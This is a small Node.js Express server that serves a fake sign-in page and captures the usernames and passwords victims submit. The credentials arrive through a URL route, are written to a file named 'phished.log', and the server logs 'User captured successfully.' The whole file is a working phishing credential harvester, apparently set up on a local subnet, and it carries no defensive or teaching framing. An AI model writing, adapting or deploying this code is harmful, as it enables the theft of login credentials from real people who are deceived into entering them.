const express = require('express');
const path = require('path');
const fs = require('fs');

// Servers and Ports
const server = express();
const serverPort = 4000;

// Served index file
const signinFile = path.join(__dirname, 'signin.html');

// Using localhost will give CORS errors since external devices connect over 192.168.50.100
// Thus, the express server is bound to the subnet IP
server.listen(serverPort, () => {
    console.log(`Server listening on port ${serverPort}`);
});

// Initial serve
server.get('/', (req, res) => {
    console.log("user connected");
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.sendFile(signinFile);
});

server.get('/:username/:password', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const username = req.params.username;
    const password = req.params.password;

    fs.writeFile('phished.log', `${username}\n${password}\n`, (err) => {
        if (err) {
            console.error('Error writing file...', err);
        } else {
            console.log('User captured successfully.');
        }
    });
});